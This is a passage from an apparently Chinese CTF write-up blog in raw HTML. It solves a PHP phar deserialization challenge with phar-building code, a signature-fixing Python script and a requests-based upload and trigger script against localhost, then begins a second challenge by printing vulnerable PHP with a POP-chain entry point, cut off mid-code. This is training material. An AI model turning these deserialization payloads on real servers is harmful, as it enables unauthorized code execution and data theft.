&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>读&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// O:1:&amp;#34;A&amp;#34;:1:{s:6:&amp;#34;config&amp;#34;;s:1:&amp;#34;r&amp;#34;;}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>对于phar&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">getflag&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">[]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">getflag&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">[]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Phar&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;phar.phar&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">startBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">setStub&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;GIF89a&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;?php __HALT_COMPILER();?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// 设置stub，增加gif文件头
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">addFromString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;test.txt&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;test&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// 添加要压缩的文件
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">setMetadata&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// 将自定义meta-data存入manifest
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">stopBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>将.metadata.bin中前面的一个i:1改为i:0后改签名&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">hashlib&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sha1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;phar.phar&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;rb&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">text&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">28&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e"># 读取开始到末尾除签名外内容&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">last&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#111">:]&lt;/span> &lt;span style="color:#75715e"># 读取最后8位的GBMB和签名flag&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">new_file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">sha1&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digest&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">last&lt;/span> &lt;span style="color:#75715e"># 生成新的文件内容 此时sha1正确&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;change.phar&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;wb&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">new_file&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>python发包，避免特殊字符&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">gzip&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://localhost/temp/tttt.php&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./chang.phar&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;rb&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">#打开文件&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">file_out&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">gzip&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./ars2.zip&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;wb+&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#75715e">#创建压缩文件对象&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">file_out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">writelines&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">file_out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;O:1:&amp;#34;A&amp;#34;:{s:6:&amp;#34;config&amp;#34;;s:1:&amp;#34;w&amp;#34;;}&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;./ars2.zip&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;rb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># 写入&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;O:1:&amp;#34;A&amp;#34;:1:{s:6:&amp;#34;config&amp;#34;;s:1:&amp;#34;r&amp;#34;;}&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;phar://tmp/a.txt&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># 触发&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220327000823801.png" alt="image-20220327000823801">&lt;/p>
&lt;p>得到flag&lt;/p>
&lt;p>参考：&lt;a href="http://arsenetang.com/2021/11/28/%E6%B5%85%E6%9E%90GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E4%B8%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">浅析GC回收机制与phar反序列化&lt;/a>&lt;/p>
&lt;h3 id="gfctf-2021文件查看器">[GFCTF 2021]文件查看器&lt;/h3>
&lt;p>User.class.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$username&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// new Myerror();
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$password&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// [new User(), &amp;#34;check&amp;#34;];
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">login&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;view/login.html&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>&lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">check&lt;/span>&lt;span style="color:#111">()){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;location:./?c=Files&amp;amp;m=read&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">check&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">的密码不正确或不存在该用户&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// Myerror::__toString
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#111">)();&lt;/span> &lt;span style="color:#75715e">// pop入口 可以通过数组形式访问任意类的任意方法 User::check
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__call&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$name&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$arg&lt;/span>&lt;span style="color:#111">){&lt;/span> &lt;span style="color:#75715e">// 不存在方法
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$name&lt;/span>&lt;span style="color:#111">)();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Files.class.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Files&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;view/file.html&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span> &lt;span style="color:#75715e">// 传入文件名
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
